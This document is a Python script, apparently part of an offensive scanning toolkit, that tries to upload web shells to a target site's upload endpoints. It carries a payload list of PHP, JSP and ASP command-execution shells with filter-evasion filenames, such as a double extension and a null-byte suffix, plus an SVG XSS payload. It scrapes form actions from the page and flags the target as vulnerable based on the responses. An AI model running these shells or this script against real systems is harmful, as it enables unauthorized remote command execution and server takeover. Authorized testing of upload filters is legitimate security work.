import httpx

PAYLOADS = [
    ("php_extension", "shell.php", "<?php system($_GET['cmd']); ?>", "application/x-php"),
    ("php_double_ext", "shell.php.jpg", "<?php system($_GET['cmd']); ?>", "image/jpeg"),
    ("php_dot_ext", "shell.php.", "<?php system($_GET['cmd']); ?>", "image/jpeg"),
    ("php_capital", "shell.PhP", "<?php system($_GET['cmd']); ?>", "image/jpeg"),
    ("php_special", "shell.php%00.jpg", "<?php system($_GET['cmd']); ?>", "image/jpeg"),
    ("php_png", "shell.png.php", "<?php system($_GET['cmd']); ?>", "image/png"),
    ("jsp_shell", "shell.jsp", "<%= Runtime.getRuntime().exec(request.getParameter(\"cmd\")) %>", "text/plain"),
    ("asp_shell", "shell.asp", "<% Execute(\"cmd\") %>", "text/plain"),
    ("svg_xss", "test.svg", '<?xml version="1.0"?><svg onload="alert(1)">', "image/svg+xml"),
]


async def upload_bypass(target: str) -> dict:
    results = []
    base = target.rstrip("/")
    upload_urls = [
        f"{base}/upload",
        f"{base}/api/upload",
        f"{base}/api/v1/upload",
        f"{base}/file/upload",
        f"{base}/upload.php",
        f"{base}/uploads",
    ]
    async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
        resp_base = await client.get(base)
        forms = __import__("re").findall(r'<form[^>]*action=["\']([^"\']*)["\']', resp_base.text)
        for f in forms:
            fu = f if f.startswith("http") else f"{base.rstrip('/')}/{f.lstrip('/')}"
            upload_urls.append(fu)
        upload_urls = list(dict.fromkeys(upload_urls))
        first_url = upload_urls[0] if upload_urls else f"{base}/upload"
        for name, filename, content, content_type in PAYLOADS:
            try:
                files = {"file": (filename, content, content_type)}
                resp = await client.post(first_url, files=files)
                size = len(resp.text)
                error_keywords = ["error", "invalid", "not allowed", "forbidden", "rejected", "type"]
                success_keywords = ["success", "uploaded", "ok", "url", "path"]
                blocked = any(k in resp.text.lower()[:300] for k in error_keywords)
                uploaded = any(k in resp.text.lower()[:300] for k in success_keywords) or resp.status_code == 200 and not blocked
                results.append({
                    "payload": name,
                    "filename": filename,
                    "status": resp.status_code,
                    "size": size,
                    "uploaded": uploaded,
                    "blocked": blocked,
                    "vulnerable": uploaded and not blocked,
                })
            except httpx.HTTPError as e:
                results.append({"payload": name, "error": str(e)})
    return {"target": target, "tests": results, "upload_bypass_possible": any(r.get("vulnerable") for r in results)}
